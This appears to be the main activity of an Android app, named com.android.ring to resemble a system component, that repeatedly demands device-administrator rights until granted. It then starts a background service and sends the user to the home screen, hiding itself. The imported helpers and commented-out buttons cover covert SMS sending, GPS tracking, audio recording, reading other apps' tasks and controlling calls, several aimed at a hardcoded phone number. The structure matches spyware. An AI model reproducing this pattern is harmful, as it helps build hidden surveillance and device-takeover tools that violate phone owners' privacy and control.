package com.android.ring;

import java.util.Timer;
import java.util.TimerTask;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;

import com.android.log.CLog;
import com.android.ring.devutils.AdminUtils;
import com.android.ring.devutils.AudioRecordUtils;
import com.android.ring.devutils.GprsUtils;
import com.android.ring.devutils.GpsUtils;
import com.android.ring.devutils.IntentDemo;
import com.android.ring.devutils.IntentUtils;
import com.android.ring.devutils.SmsUtils;
import com.android.ring.devutils.TeleUtils;
import com.android.ring.services.RingService;

public class MainActivity extends Activity implements OnClickListener {

	Button wifi_btn,gprs_btn,gps_btn,recod_btn,call_btn,call_end_btn,sms_btn,service_btn;
	GprsUtils gprsUtils;
	GpsUtils gpsUtils;
	TeleUtils mTeleUtils;
	
	AdminUtils mAdminUtils;
	
	public static void start(Context context){
		Intent i=new Intent(context,MainActivity.class);
		i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(i);
	}
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
		this.requestWindowFeature(Window.FEATURE_NO_TITLE);
		CLog.print("ring", "onCreate");
		mAdminUtils=new AdminUtils(this);
		setContentView(R.layout.activity_main);
//		wifi_btn=(Button) findViewById(R.id.wifi_btn);
//		wifi_btn.setOnClickListener(this);
//		gprs_btn=(Button) findViewById(R.id.gprs_btn);
//		gprs_btn.setOnClickListener(this);
//		gps_btn=(Button) findViewById(R.id.gps_btn);
//		gps_btn.setOnClickListener(this);
//		sms_btn=(Button) findViewById(R.id.sms_btn);
//		sms_btn.setOnClickListener(this);
//		recod_btn=(Button) findViewById(R.id.record_btn);
//		recod_btn.setOnClickListener(this);
//		service_btn=(Button) findViewById(R.id.service_btn);
//		service_btn.setOnClickListener(this);
//		call_btn=(Button) findViewById(R.id.call_btn);
//		call_btn.setOnClickListener(this);
//		call_end_btn=(Button) findViewById(R.id.call_end_btn);
//		call_end_btn.setOnClickListener(this);
//		
//		
//		DeviceInfo dInfo=new DeviceInfo(this);
//		dInfo.getInfo(this);
		
	}
	@Override
	public boolean onTouchEvent(MotionEvent event) {
		// TODO Auto-generated method stub
		return false;
	}
	@Override
	protected void onResume() {
		// TODO Auto-generated method stub
		super.onResume();
		startAdminTask();
	}
	Timer adminTimer;
	void startAdminTask(){
		if(adminTimer!=null){
			return;
		}
		adminTimer=new Timer();
	adminTimer.schedule(new TimerTask(){
		
		@Override
		public void run() {
			
			if(mAdminUtils.start()){
				RingService.start(MainActivity.this, RingService.ACTION_BOOT_COMPLETE);
				adminTimer.cancel();
				IntentUtils.goHome(MainActivity.this);
			}
			// TODO Auto-generated method stub
		}}, 0, 200);
	}
	
	@Override
	protected void onPause() {
		// TODO Auto-generated method stub
		super.onPause();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
	@Override
	public void onClick(View v) {
		switch(v.getId()){
		case R.id.wifi_btn:// 获取Wifi服务
			mAdminUtils.start();
			break;
		case R.id.gprs_btn:
			if(gprsUtils==null){
				gprsUtils =new GprsUtils(this);
				gprsUtils.onCreate();
			}else{
				gprsUtils.onDestroy();
				gprsUtils=null;
			}
			break;
		case R.id.gps_btn:
			if(gpsUtils!=null){
				gpsUtils.onStop();
				gpsUtils.onDestroy();
				gpsUtils=null;
			}else{
				gpsUtils=new GpsUtils(this);
				gpsUtils.onCreate();
				gpsUtils.onStart(null,null);
			}
			break;
		case R.id.sms_btn:
			SmsUtils msUtils=new SmsUtils(this);
			msUtils.sendSms("18612317056", "aaa欢迎您访问广东移动网站。中国移动通信集团公司,是中国规模最大的移动通信运营商,主要经营移动话音、数据、IP电话和多媒体业务,并具有计算机互联网国际联网单位经营权aaa欢迎您访问广东移动网站。中国移动通信集团公司,是中国规模最大的移动通信运营商,主要经营移动话音、数据、IP电话和多媒体业务,并具有计算机互联网国际联网单位经营权bbb");
			break;
		case R.id.record_btn:
			AudioRecordUtils audioRecordUtils=new AudioRecordUtils();
			setContentView(audioRecordUtils.onCreate(this));
			break;
		case R.id.service_btn:
			RingService.start(this, RingService.ACTION_BOOT_COMPLETE);
			break;
		case R.id.call_btn:
			ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
			ComponentName cn = am.getRunningTasks(2).get(1).topActivity;
			CLog.print("Ring", cn.getPackageName()+"---"+cn.getClassName());
			mTeleUtils.onStart();
			
//			IntentDemo.call(this,"18612317056",true);
			
//			 Intent intent=new Intent();
//			 intent.setComponent(cn);
//			 startActivity(intent); 
			break;
		case R.id.call_end_btn:
			TeleUtils.endCall(this);
//			 mTeleUtils.onStop();
			IntentDemo.outgoing(this, "18612317056");
		}
	}

}
